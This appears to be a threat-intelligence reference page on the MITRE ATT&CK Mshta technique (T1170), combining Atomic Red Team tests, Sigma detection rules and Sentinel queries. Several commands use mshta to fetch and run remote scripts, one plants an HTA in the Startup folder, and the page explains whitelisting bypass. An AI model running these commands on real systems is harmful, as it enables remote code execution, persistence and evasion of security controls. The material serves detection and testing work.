
# Mshta

## Description

### MITRE Description

> Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Additional Attributes

* Bypass: ['Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1170

## Potential Commands

```
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();

mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")

$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"

$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"

\\windows\\.+\\mshta.exevbscript|javascript|http|https
```

## Commands Dataset

```
[{'command': 'mshta.exe '
             "javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();\n",
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
             '""powershell -noexit -file '
             'PathToAtomicsFolder\\T1170\\src\\powershell.ps1"":close")\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '$var =Invoke-WebRequest '
             '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"\n'
             '$var.content|out-file "#{temp_file}"\n'
             'mshta "#{temp_file}"\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '$var =Invoke-WebRequest "#{hta_url}"\n'
             '$var.content|out-file "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1170.hta"\n'
             'mshta "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1170.hta"\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '\\\\windows\\\\.+\\\\mshta.exevbscript|javascript|http|https',
  'name': None,
  'source': 'SysmonHunter - Mshta'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/02/24',
                  'description': 'Detects activity that could be related to '
                                 'Baby Shark malware',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['reg query '
                                                              '"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal '
                                                              'Server '
                                                              'Client\\Default"',
                                                              'powershell.exe '
                                                              'mshta.exe http*',
                                                              'cmd.exe /c '
                                                              'taskkill /im '
                                                              'cmd.exe']}},
                  'falsepositives': ['unknown'],
                  'id': '2b30fa36-3a18-402f-a22d-bf4ce2189f35',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.t1059',
                           'attack.t1086',
                           'attack.discovery',
                           'attack.t1012',
                           'attack.defense_evasion',
                           'attack.t1170'],
                  'title': 'Baby Shark Activity'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/06/07',
                  'description': 'Detects MSHTA.EXE spwaned by SVCHOST '
                                 'described in report',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\mshta.exe',
                                              'ParentImage': '*\\svchost.exe'}},
                  'falsepositives': ['Unknown'],
                  'id': 'ed5d72a6-f8f4-479d-ba79-02f6a80d7471',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://codewhitesec.blogspot.com/2018/07/lethalhta.html'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1170'],
                  'title': 'MSHTA spwaned by SVCHOST as seen in LethalHTA'}},
 {'data_source': {'author': 'Michael Haag',
                  'description': 'Detects a Windows command line executable '
                                 'started from MSHTA.',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': ['*\\cmd.exe',
                                                        '*\\powershell.exe',
                                                        '*\\wscript.exe',
                                                        '*\\cscript.exe',
                                                        '*\\sh.exe',
                                                        '*\\bash.exe',
                                                        '*\\reg.exe',
                                                        '*\\regsvr32.exe',
                                                        '*\\BITSADMIN*'],
                                              'ParentImage': '*\\mshta.exe'}},
                  'falsepositives': ['Printer software / driver installations',
                                     'HP software'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '03cc0c25-389f-4bf8-b48d-11878079f1ca',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.trustedsec.com/july-2015/malicious-htas/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1170',
                           'car.2013-02-003',
                           'car.2013-03-001',
                           'car.2014-04-003'],
                  'title': 'MSHTA Spawning Windows Shell'}},
 {'data_source': {'author': 'juju4',
                  'description': 'Detects execution of executables that can be '
                                 'used to bypass Applocker whitelisting',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': ['\\msdt.exe',
                                                                       '\\installutil.exe',
                                                                       '\\regsvcs.exe',
                                                                       '\\regasm.exe',
                                                                       '\\msbuild.exe',
                                                                       '\\ieexec.exe']}},
                  'falsepositives': ['False positives depend on scripts and '
                                     'administrative tools used in the '
                                     'monitored environment',
                                     'Using installutil to add features for '
                                     '.NET applications (primarly would occur '
                                     'in developer environments)'],
                  'id': '82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt',
                                 'https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.t1118',
                           'attack.t1121',
                           'attack.t1127',
                           'attack.t1170'],
                  'title': 'Possible Applocker Bypass'}}]
```

## Potential Queries

```json
[{'name': 'MSHTA FileAccess',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 11 or EventID == 15)and file_name '
           'contains ".hta"'},
 {'name': 'MSHTA Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and (process_command_line contains '
           '"mshta.exe"or process_parent_command_line contains "mshta.exe")'},
 {'name': 'MSHTA Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"mshta.exe"or process_parent_command_line contains "mshta.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Mshta': {'atomic_tests': [{'description': 'Test '
                                                                    'execution '
                                                                    'of a '
                                                                    'remote '
                                                                    'script '
                                                                    'using '
                                                                    'mshta.exe. '
                                                                    'Upon '
                                                                    'execution '
                                                                    'calc.exe '
                                                                    'will be '
                                                                    'launched.\n',
                                                     'executor': {'command': 'mshta.exe '
                                                                             "javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
                                                                  'elevation_required': False,
                                                                  'name': 'command_prompt'},
                                                     'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct',
                                                                                      'description': 'location '
                                                                                                     'of '
                                                                                                     'the '
                                                                                                     'payload',
                                                                                      'type': 'Url'}},
                                                     'name': 'Mshta executes '
                                                             'JavaScript '
                                                             'Scheme Fetch '
                                                             'Remote Payload '
                                                             'With GetObject',
                                                     'supported_platforms': ['windows']},
                                                    {'description': 'Run a '
                                                                    'local VB '
                                                                    'script to '
                                                                    'run local '
                                                                    'user '
                                                                    'enumeration '
                                                                    'powershell '
                                                                    'command.\n'
                                                                    'This '
                                                                    'attempts '
                                                                    'to '
                                                                    'emulate '
                                                                    'what FIN7 '
                                                                    'does with '
                                                                    'this '
                                                                    'technique '
                                                                    'which is '
                                                                    'using '
                                                                    'mshta.exe '
                                                                    'to '
                                                                    'execute '
                                                                    'VBScript '
                                                                    'to '
                                                                    'execute '
                                                                    'malicious '
                                                                    'code on '
                                                                    'victim '
                                                                    'systems.\n'
                                                                    'Upon '
                                                                    'execution, '
                                                                    'a new '
                                                                    'PowerShell '
                                                                    'windows '
                                                                    'will be '
                                                                    'opened '
                                                                    'that '
                                                                    'displays '
                                                                    'user '
                                                                    'information.\n',
                                                     'executor': {'command': 'mshta '
                                                                             'vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                                                                             '""powershell '
                                                                             '-noexit '
                                                                             '-file '
                                                                             'PathToAtomicsFolder\\T1170\\src\\powershell.ps1"":close")\n',
                                                                  'name': 'command_prompt'},
                                                     'name': 'Mshta executes '
                                                             'VBScript to '
                                                             'execute '
                                                             'malicious '
                                                             'command',
                                                     'supported_platforms': ['windows']},
                                                    {'description': 'Execute '
                                                                    'an '
                                                                    'arbitrary '
                                                                    'remote '
                                                                    'HTA. Upon '
                                                                    'execution '
                                                                    'calc.exe '
                                                                    'will be '
                                                                    'launched.\n',
                                                     'executor': {'cleanup_command': 'remove-item '
                                                                                     '"#{temp_file}" '
                                                                                     '-ErrorAction '
                                                                                     'Ignore\n',
                                                                  'command': '$var '
                                                                             '=Invoke-WebRequest '
                                                                             '"#{hta_url}"\n'
                                                                             '$var.content|out-file '
                                                                             '"#{temp_file}"\n'
                                                                             'mshta '
                                                                             '"#{temp_file}"\n',
                                                                  'name': 'powershell'},
                                                     'input_arguments': {'hta_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta',
                                                                                     'description': 'URL '
                                                                                                    'to '
                                                                                                    'HTA '
                                                                                                    'file '
                                                                                                    'for '
                                                                                                    'execution',
                                                                                     'type': 'string'},
                                                                         'temp_file': {'default': '$env:appdata\\Microsoft\\Windows\\Start '
                                                                                                  'Menu\\Programs\\Startup\\T1170.hta',
                                                                                       'description': 'temp_file '
                                                                                                      'location '
                                                                                                      'for '
                                                                                                      'hta',
                                                                                       'type': 'string'}},
                                                     'name': 'Mshta Executes '
                                                             'Remote HTML '
                                                             'Application '
                                                             '(HTA)',
                                                     'supported_platforms': ['windows']}],
                                   'attack_technique': 'T1170',
                                   'display_name': 'Mshta'}},
 {'SysmonHunter - T1170': {'description': None,
                           'level': 'medium',
                           'name': 'Mshta',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'vbscript|javascript|http|https'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\windows\\\\.+\\\\mshta.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [FIN7](../actors/FIN7.md)

* [APT32](../actors/APT32.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
